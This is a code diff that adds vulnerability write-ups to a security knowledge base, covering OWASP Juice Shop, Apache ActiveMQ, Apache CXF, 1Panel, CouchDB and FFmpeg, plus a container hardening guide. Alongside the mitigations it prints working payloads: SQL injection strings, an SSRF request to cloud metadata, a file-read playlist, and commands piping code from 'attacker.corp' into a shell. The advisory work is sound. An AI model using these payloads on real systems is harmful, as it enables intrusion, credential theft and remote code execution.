@@ -391,6 +391,253 @@ The request invokes the Web Services Management Agent (WSMA) with root credentia
 Adversaries subsequently chained CVE-2023-20273 to write a 16-character hexadecimal token into the web server file system (/usr/binos/conf/iocache/), deploying an interactive Lua backdoor.
 Mitigation: Immediately disable the Web UI on all internet-exposed Cisco IOS XE devices by issuing configuration commands: 'no ip http server' and 'no ip http secure-server'. Update devices to fixed Cisco IOS XE releases (17.9.4a+, 17.6.6a+, 17.3.8a+).""",
     },
+    {
+        "title": "OWASP Juice Shop (bkimminich/juice-shop) Insecure Container & Web Application Architecture Deep Dive",
+        "category": KBCategory.VULN_WRITEUP,
+        "tags": ["juice-shop", "docker", "container_security", "owasp", "supply_chain", "angular", "node_js", "sca"],
+        "content": """## Executive Summary
+OWASP Juice Shop (packaged as the official container image `bkimminich/juice-shop`) is the industry-standard intentionally vulnerable web application and training environment. Architected as a modern rich Single Page Application (SPA) with a REST API backend, it models the entire OWASP Top 10 Web Application Security Risks and OWASP API Security Top 10 vulnerabilities across more than 100 progressive technical challenges. It serves as a benchmark target for security education, penetration testing, Capture-The-Flag (CTF) exercises, and automated security scanner evaluation (DAST, SAST, SCA, and container runtime analysis).
+
+## Affected Systems & Scope
+- Container Images: `bkimminich/juice-shop:latest`, `bkimminich/juice-shop:v16.0.0` (and historical versions), with official multi-architecture support for `linux/amd64` and `linux/arm64`.
+- Software Stack: Node.js runtime, Express web framework, Angular frontend SPA, SQLite database (via Sequelize ORM), and client-side MarsDB.
+- Container Hardening Profile: Modern releases build upon Google Distroless Node.js base container images using multi-stage Docker builds with development dependencies stripped (`--omit=dev`). The container process executes under an unprivileged user UID (`65532`) rather than root, demonstrating least-privilege containerization despite intentional internal application vulnerabilities.
+- Exposure Context: Local development Docker hosts, training Kubernetes clusters (`juice-shop-ctf`), CI/CD security pipelines, and isolated laboratory subnets.
+
+## Threat Impact Analysis
+Although the outer container packaging utilizes modern distroless and non-root isolation patterns, the inner application environment is engineered with critical exploitable flaws across multiple threat boundaries:
+1. Critical Injection & Authentication Bypass: Unsanitized SQL and NoSQL queries allow unauthenticated adversaries to bypass login controls (`' OR 1=1--`), dump the full user database, extract PBKDF2/bcrypt credential hashes, and impersonate administrative accounts via JSON Web Token (JWT) forgery.
+2. Software Supply Chain & Vulnerable Dependency Exposure: The application intentionally includes known vulnerable direct and transitive npm dependencies (such as legacy versions of `body-parser`, `express-jwt`, `marsdb`, `sanitize-html`, and packages vulnerable to prototype pollution). These are structured specifically to trigger Software Composition Analysis (SCA) alerts (CVE tracking).
+3. Server-Side Request Forgery (SSRF) & Internal Pivot: Certain image retrieval and file download endpoints can be coerced into initiating requests to internal host services or cloud instance metadata services (`http://169.254.169.254/`), posing significant risk if deployed within unsegmented cloud environments.
+4. Client-Side DOM & Cross-Site Scripting (XSS): Endpoints and search features throughout the Angular application omit contextual encoding, enabling stored, reflected, and DOM-based XSS attacks that compromise browser sessions and harvest local storage tokens.
+
+## Evidence & Technical Details
+- Container Execution Invocations:
+  Standard interactive execution:
+  `docker run --rm -p 3000:3000 --name juice-shop bkimminich/juice-shop:latest`
+  Hardened sandbox deployment:
+  `docker run --rm --read-only --tmpfs /tmp --tmpfs /juice-shop/build -p 3000:3000 --cap-drop=ALL --security-opt=no-new-privileges:true bkimminich/juice-shop:latest`
+- Vulnerable Authentication SQL Injection Vector:
+  POST /rest/user/login HTTP/1.1
+  Host: localhost:3000
+  Content-Type: application/json
+  {"email": "' OR 1=1--", "password": "arbitrary_password"}
+  Sequelize concatenates the unvalidated email input directly into the SQL query string, resolving `WHERE email = '' OR 1=1--` to true, instantly returning the administrator session token in the HTTP response.
+- Obsolete File & Dependency Exposure (/ftp):
+  An attacker leverages path traversal and null-byte bypass on the FTP directory to download forgotten developer backups:
+  `GET /ftp/package.json.bak%2500.md HTTP/1.1`
+  This reveals exact pinned dependency versions, internal cryptographic salts, and configuration parameters.
+- Scanner Footprint:
+  Running container scanners (e.g., `trivy image bkimminich/juice-shop`) and SCA scanners (`npm audit`) surfaces over 100 historical CVEs spanning Critical to Medium severities across npm packages and runtime modules.
+- Remediation & Defense in Depth:
+  For enterprise networks running Juice Shop for training, isolate the container on an internal bridge network with all egress to RFC1918 subnets and cloud metadata services blocked by firewall/NetworkPolicy rules. Enforce read-only root filesystems, drop all Linux capabilities (`CAP_SYS_ADMIN`, `CAP_NET_RAW`), and prohibit running in production VPCs.""",
+    },
+    {
+        "title": "CVE-2026-34197 (Apache ActiveMQ Classic) Jolokia JMX-HTTP Remote Code Execution Analysis",
+        "category": KBCategory.VULN_WRITEUP,
+        "tags": ["cve-2026-34197", "apache", "activemq", "rce", "jolokia", "jmx", "spring", "cwe-20", "cwe-94", "cwe-78"],
+        "content": """## Executive Summary
+CVE-2026-34197 (CVSS 8.8, High / Critical) is a high-severity Remote Code Execution (RCE) vulnerability in Apache ActiveMQ Classic. It stems from improper input validation and unsafe management operations exposed via the Jolokia JMX-HTTP bridge (`/api/jolokia/`) on the web console. An attacker can invoke operations on ActiveMQ core MBeans that coerce the broker's Java Virtual Machine (JVM) into loading an arbitrary Spring XML application context from a remote URI, executing arbitrary operating system commands with broker process privileges.
+
+## Affected Systems & Scope
+- Apache ActiveMQ Classic broker versions before 5.19.4.
+- Apache ActiveMQ Classic broker versions from 6.0.0 before 6.2.3.
+- ActiveMQ installations where the web console or Jolokia HTTP endpoint (`/api/jolokia/` on TCP port 8161) is accessible over the network without strict authentication or reverse proxy isolation.
+
+## Threat Impact Analysis
+Apache ActiveMQ is a foundational enterprise message broker deployed to route asynchronous transactions, integration events, and distributed workflows. Successful exploitation enables unauthenticated or authenticated adversaries to obtain full Remote Code Execution (RCE) on the underlying broker operating system. Compromised brokers allow attackers to eavesdrop on all message queues, alter financial or business data in transit, implant persistent rootkits, and pivot into internal database clusters and core backend networks.
+
+## Evidence & Technical Details
+The vulnerability exploits ActiveMQ's Jolokia JMX-HTTP bridge, which permits HTTP-based invocation of JMX MBean operations:
+1. Under default Jolokia access configurations, clients can invoke `exec` actions on MBeans within the `org.apache.activemq:*` namespace.
+2. The attacker targets the `BrokerService` MBean, invoking operations such as `addNetworkConnector(java.lang.String)` or `addConnector(java.lang.String)` with a crafted discovery URI parameter:
+   POST /api/jolokia/exec/org.apache.activemq:type=Broker,brokerName=localhost,service=BrokerService/addNetworkConnector(java.lang.String)/vm:(broker:(tcp:%2F%2F0.0.0.0:61616)?useJmx=false&persistent=false)?brokerConfig=xbean:http:%2F%2Fattacker.corp%2Factivemq-rce.xml HTTP/1.1
+   Host: target.broker:8161
+   Connection: close
+3. The VM transport parser inspects the `brokerConfig` parameter and triggers configuration parsing via Spring's `ResourceXmlApplicationContext`.
+4. Because `ResourceXmlApplicationContext` instantiates all singleton beans prior to broker configuration validation, beans configured with `java.lang.ProcessBuilder` or `java.lang.Runtime.getRuntime().exec()` execute immediately:
+   ```xml
+   <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+       <bean id="rce" class="java.lang.ProcessBuilder" init-method="start">
+           <constructor-arg>
+               <list>
+                   <value>/bin/sh</value>
+                   <value>-c</value>
+                   <value>curl -s http://attacker.corp/payload | bash</value>
+               </list>
+           </constructor-arg>
+       </bean>
+   </beans>
+   ```
+5. Verification & Forensic Inspection: Inspect `activemq.log` and web console access logs for unusual HTTP POST requests to `/api/jolokia/exec/` referencing `addNetworkConnector` or external `http://` schema URIs in `brokerConfig`.
+Mitigation:
+1. Upgrade Apache ActiveMQ Classic immediately to version 5.19.4 (for 5.x branches) or version 6.2.3 (for 6.x branches).
+2. Restrict network access to TCP port 8161 via host firewalls or place the web console strictly behind authenticated bastion reverse proxies.
+3. Restrict or disable Jolokia operations in `conf/jolokia-access.xml` to disallow remote MBean `exec` operations.""",
+    },
+    {
+        "title": "CVE-2024-28752 (Apache CXF Aegis DataBinding) Server-Side Request Forgery Technical Analysis",
+        "category": KBCategory.VULN_WRITEUP,
+        "tags": ["cve-2024-28752", "apache", "cxf", "ssrf", "aegis", "soap", "xml", "cwe-918", "jax-ws"],
+        "content": """## Executive Summary
+CVE-2024-28752 (CVSS 9.3, Critical) is a critical Server-Side Request Forgery (SSRF) vulnerability affecting the Apache CXF open-source web services framework. When web services utilize the optional Aegis databinding subsystem and accept one or more parameters of any type, an external unauthenticated attacker can supply crafted XML-binary Optimized Packaging (XOP) elements with target URIs, forcing the CXF server runtime into making arbitrary outbound HTTP or TCP network requests.
+
+## Affected Systems & Scope
+- Apache CXF versions before 3.5.8.
+- Apache CXF versions 3.6.0 through 3.6.2 (patched in 3.6.3).
+- Apache CXF versions 4.0.0 through 4.0.3 (patched in 4.0.4).
+- Specifically impacts web services explicitly configured with the Aegis DataBinding module (`org.apache.cxf.aegis.databinding.AegisDatabinding`). Deployments utilizing CXF's default JAXB databinding subsystem are not affected.
+
+## Threat Impact Analysis
+Exploitation of CVE-2024-28752 allows attackers to leverage the web service host as an internal network proxy. In cloud-hosted environments (AWS, GCP, Azure), adversaries can exploit this SSRF primitive to query link-local cloud metadata services (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), extracting temporary administrative IAM credentials. On internal enterprise networks, the vulnerability enables unauthorized port scanning, access to protected intranet management dashboards, interaction with unauthenticated Redis/Memcached instances, and potential data exfiltration via error reflection.
+
+## Evidence & Technical Details
+The vulnerability exists in Aegis DataBinding's implementation of XML-binary Optimized Packaging (XOP):
+1. Web service parameters processed by Aegis allow attachment inclusion using `<xop:Include>` elements.
+2. An attacker submits a crafted SOAP envelope or REST XML payload containing an `xop:Include` tag pointing to an arbitrary destination URI:
+   ```xml
+   <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://services.enterprise.corp/">
+      <soapenv:Header/>
+      <soapenv:Body>
+         <ser:processPayload>
+            <requestData>
+               <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/ecs-task-role"/>
+            </requestData>
+         </ser:processPayload>
+      </soapenv:Body>
+   </soapenv:Envelope>
+   ```
+3. During XML unmarshalling, CXF's Aegis XOP handler automatically initiates an outbound connection to retrieve the referenced stream without verifying destination host IP addresses, protocol schemes, or private CIDR blocks.
+4. If the service deserialization error or response body echoes unmarshalled stream content, internal metadata tokens or intranet response payloads are returned directly to the attacker.
+Mitigation:
+1. Upgrade Apache CXF to secure releases: 3.5.8+, 3.6.3+, or 4.0.4+.
+2. Migrate service databinding configurations from Aegis to CXF's standard JAXB databinding (`org.apache.cxf.jaxb.JAXBDataBinding`).
+3. Enforce container and host-level egress network filtering prohibiting application containers from initiating outbound connections to link-local address blocks (`169.254.169.254/32`) and non-essential intranet segments.""",
+    },
+    {
+        "title": "CVE-2024-39907 (FIT2CLOUD 1Panel) SQL Injection & Remote Code Execution Analysis",
+        "category": KBCategory.VULN_WRITEUP,
+        "tags": ["cve-2024-39907", "fit2cloud", "1panel", "sqli", "rce", "cwe-89", "golang", "gorm", "linux"],
+        "content": """## Executive Summary
+CVE-2024-39907 (CVSS 9.8, Critical) is a critical SQL injection vulnerability in FIT2CLOUD 1Panel, an open-source Linux server and container management control panel written in Go. The vulnerability arises from improper input sanitization of ordering parameters (such as `orderBy`) passed to backend GORM database query methods, enabling remote attackers to execute arbitrary SQL commands against the database, exfiltrate sensitive administrative credentials, and achieve root-level Remote Code Execution (RCE) on the host server.
+
+## Affected Systems & Scope
+- FIT2CLOUD 1Panel versions prior to v1.10.12-lts.
+- Linux hosts running 1Panel control panel web consoles accessible across public internet interfaces or internal enterprise networks (default TCP port 8200 or custom ports).
+
+## Threat Impact Analysis
+Because 1Panel is designed as a centralized server administration portal managing Docker containers, firewall rules, scheduled cron tasks, file systems, and system users, the panel daemon runs with elevated root privileges. Successful exploitation of CVE-2024-39907 allows adversaries to bypass authentication, retrieve administrative account passwords and multi-factor authentication (MFA) secrets, and manipulate backend tables. Attackers can leverage administrative privileges to execute arbitrary shell scripts through 1Panel's Host Command Execution API, resulting in complete, irreversible takeover of the Linux operating system.
+
+## Evidence & Technical Details
+The vulnerability is rooted in insecure dynamic query construction across several backend endpoints, notably `/api/v1/hosts/command/search` and container search routines:
+1. The 1Panel Go backend extracts the `orderBy` parameter directly from incoming JSON request bodies.
+2. In vulnerable versions, this parameter is passed directly into GORM's `.Order(...)` query builder or concatenated via `fmt.Sprintf` without column-name whitelisting:
+   ```go
+   // Vulnerable query construction in 1Panel < 1.10.12-lts:
+   db.Model(&commandModel).Where(...).Order(req.OrderBy).Find(&commands)
+   ```
+3. An attacker issues an HTTP POST request injecting SQL syntax into the `orderBy` parameter:
+   POST /api/v1/hosts/command/search HTTP/1.1
+   Host: panel.target.corp:8200
+   Content-Type: application/json
+   {"page": 1, "pageSize": 10, "orderBy": "(CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE name='admin')='$' THEN id ELSE name END) ASC"}
+4. Using automated blind SQL injection, the attacker reconstructs the administrative password hash and API authorization tokens.
+5. Once authenticated as administrator, the attacker invokes 1Panel's system execution features or writes scheduled tasks under `/etc/cron.d/` to trigger a root reverse shell.
+Mitigation:
+1. Immediately update 1Panel installations to version `v1.10.12-lts` or higher.
+2. Restrict external network exposure of the 1Panel administration port by binding it to localhost (`127.0.0.1`) and tunneling access through SSH or an enterprise Zero Trust VPN.
+3. Enforce strong complex passwords and enable Time-based One-Time Password (TOTP) two-factor authentication for all panel operators.""",
+    },
+    {
+        "title": "CVE-2017-12636 (Apache CouchDB) Administrative Command Injection & Privilege Escalation Analysis",
+        "category": KBCategory.VULN_WRITEUP,
+        "tags": ["cve-2017-12636", "apache", "couchdb", "command_injection", "rce", "privilege_escalation", "cwe-78", "erlang"],
+        "content": """## Executive Summary
+CVE-2017-12636 (CVSS 7.2, High / chained Critical) is a command injection and remote code execution vulnerability in Apache CouchDB. It allows administrative users to configure arbitrary operating system command strings via CouchDB's HTTP configuration API (`/_config`), which CouchDB subsequently launches when processing query servers or database triggers. When chained with companion vulnerability CVE-2017-12635 (privilege escalation via duplicate JSON keys), unauthenticated remote attackers can gain full code execution as the `couchdb` system user.
+
+## Affected Systems & Scope
+- Apache CouchDB versions prior to 1.7.0.
+- Apache CouchDB 2.x versions prior to 2.1.1.
+- CouchDB installations where the administrative HTTP API port (TCP port 5984) is accessible over the network.
+
+## Threat Impact Analysis
+Apache CouchDB is an open-source document-oriented NoSQL database. The pairing of CVE-2017-12636 with CVE-2017-12635 is considered one of the classic NoSQL exploitation chains: an unauthenticated remote attacker can exploit JSON parser discrepancies between Erlang and JavaScript to register a new cluster administrator account, and then immediately invoke the configuration API to launch arbitrary shell binaries on the operating system. This grants complete control over stored document databases, host file systems, and internal network pivot points.
+
+## Evidence & Technical Details
+The vulnerability exists because CouchDB's HTTP API allowed administrators to modify runtime settings in the `query_servers` configuration block, defining external executable binaries invoked to evaluate non-JavaScript map/reduce queries:
+1. Setting Rogue Query Server:
+   PUT /_config/query_servers/cmd HTTP/1.1
+   Host: target.couchdb:5984
+   Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+   Content-Type: application/json
+   "curl http://attacker.corp/revshell.sh | /bin/sh"
+2. Triggering Command Execution:
+   The attacker creates a temporary database and triggers a view query specifying the newly defined `cmd` query server:
+   POST /testdb/_temp_view HTTP/1.1
+   Host: target.couchdb:5984
+   Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+   Content-Type: application/json
+   {"language": "cmd", "map": ""}
+3. CouchDB's Erlang supervisor spawns an operating system process running the configured command string via `open_port/2`, executing the payload with the privileges of the CouchDB operating system daemon.
+Mitigation:
+1. Upgrade Apache CouchDB to version 1.7.0 or 2.1.1 or higher, which disables dynamic query server configuration via the HTTP API by default.
+2. Bind the CouchDB daemon strictly to `127.0.0.1` and enforce reverse proxy authentication with TLS.
+3. Configure `query_server` and `external` command execution paths exclusively in static, read-only configuration files protected by strict operating system file permissions.""",
+    },
+    {
+        "title": "CVE-2017-9993 (FFmpeg) Multimedia Playlist Demuxer Arbitrary File Read Analysis",
+        "category": KBCategory.VULN_WRITEUP,
+        "tags": ["cve-2017-9993", "ffmpeg", "arbitrary_file_read", "information_disclosure", "cwe-200", "hls", "avi", "transcoding"],
+        "content": """## Executive Summary
+CVE-2017-9993 (CVSS 7.5, High) is an arbitrary file disclosure vulnerability in the FFmpeg multimedia processing framework. It arises from improper sanitization and protocol handling within playlist demuxers (specifically HTTP Live Streaming / HLS and container formats like AVI with embedded playlist streams). An attacker can upload a specially crafted multimedia file that forces the transcoding engine to read arbitrary local system files (such as `/etc/passwd` or configuration secrets) and embed the contents into the generated video streams or error logs.
+
+## Affected Systems & Scope
+- FFmpeg versions before 2.8.12.
+- FFmpeg 3.0.x versions before 3.0.9.
+- FFmpeg 3.1.x versions before 3.1.9.
+- FFmpeg 3.2.x versions before 3.2.6.
+- FFmpeg 3.3.x versions before 3.3.2.
+- Any web application, media sharing platform, video conversion service, or thumbnail generation pipeline that invokes unpatched FFmpeg binaries or `libavformat` on user-supplied media files.
+
+## Threat Impact Analysis
+Web platforms frequently accept user-uploaded video and audio files and automatically transcode them into standardized formats (e.g. MP4/H.264) or generate preview thumbnails. Exploitation allows unauthenticated attackers to read sensitive local files from the server, including cloud credentials (`~/.aws/credentials`), database connection strings, SSH private keys, and application source code. If the video output is rendered publicly or error frames are displayed to the user, exfiltration is immediate.
+
+## Evidence & Technical Details
+This vulnerability represents a bypass of previous remediations for CVE-2016-1897:
+1. The attacker crafts an AVI file whose GAB2 subtitle chunk or video stream references an HLS playlist (`.m3u8`):
+   #EXTM3U
+   #EXT-X-MEDIA-SEQUENCE:0
+   #EXTINF:1.0
+   file:///etc/passwd
+   #EXT-X-ENDLIST
+2. When FFmpeg processes the crafted container, the HLS demuxer resolves the file path directive without verifying that the referenced segment resides within an approved media directory or protocol whitelist.
+3. FFmpeg reads `/etc/passwd` as raw audio/video frames. In video transcoding scenarios, the text bytes of `/etc/passwd` are interpreted as pixel luminance/chrominance values and encoded into the output video.
+4. The attacker downloads the transcoded video and extracts the pixel data or subtitle stream, reconstructing the plaintext contents of `/etc/passwd`.
+Mitigation:
+1. Upgrade FFmpeg to patched versions (`2.8.12`, `3.1.9`, `3.2.6`, `3.3.2` or later).
+2. In web applications invoking FFmpeg, enforce strict protocol whitelisting by adding `-protocol_whitelist "file,crypto"` or restricting input strictly to standard non-playlist formats.
+3. Run media processing workers in isolated, unprivileged containers or sandboxes with a read-only root filesystem and no access to host secrets or internal networks.""",
+    },
+    {
+        "title": "OWASP Juice Shop & Insecure Container Runtime Hardening Remediation Guide",
+        "category": KBCategory.REMEDIATION_GUIDE,
+        "tags": ["juice-shop", "container_security", "docker", "hardening", "remediation", "least_privilege"],
+        "content": """## Remediation & Patch Steps
+1. Enforce strict container network isolation: Never deploy intentionally vulnerable container images (such as `bkimminich/juice-shop`) on host networks or default Docker bridge networks. Bind containers exclusively to dedicated internal Docker bridge networks with no access to corporate RFC1918 subnets or cloud metadata services (`169.254.169.254`).
+2. Implement Read-Only Root Filesystem constraints: Launch containers with `--read-only` flags, restricting write permissions exclusively to ephemeral in-memory tmpfs mount points (`--tmpfs /tmp --tmpfs /juice-shop/build`).
+3. Drop all Linux Kernel Capabilities: Revoke all ambient capabilities using `--cap-drop=ALL`. Prohibit privilege escalation flags via `--security-opt=no-new-privileges:true`.
+4. Enforce Non-Root Execution: Verify that container processes run under unprivileged service user accounts (e.g. UID 65532 in Distroless images) rather than UID 0 (root).
+5. Implement Kubernetes NetworkPolicies: In Kubernetes training deployments (`juice-shop-ctf`), enforce ingress and egress NetworkPolicies that reject outbound traffic to external internet addresses or cluster-internal CIDRs.
+6. Automate Container Image Vulnerability Scanning: Integrate scanners (Trivy, Grype, or Clair) into container registries to detect unpatched base image packages and vulnerable dependencies.
+
+## Verification Procedure
+Deploy candidate test containers and verify isolation controls:
+1. Execute `docker inspect <container_id>` to confirm that `ReadonlyRootfs` is `true`, `CapDrop` contains `ALL`, and `SecurityOpt` contains `no-new-privileges:true`.
+2. Probe network egress from inside the container using `curl -m 3 http://169.254.169.254/` to confirm that link-local cloud metadata requests are actively rejected or timed out.
+3. Validate non-root execution by checking `/proc/self/status` or running `id` to confirm that effective UID is non-zero.
+4. Execute automated vulnerability scans using `trivy image bkimminich/juice-shop` to benchmark detected CVE counts against established security baselines.""",
+    },
 
     # =========================================================================
     # 3. REMEDIATION GUIDES (10 Documents)
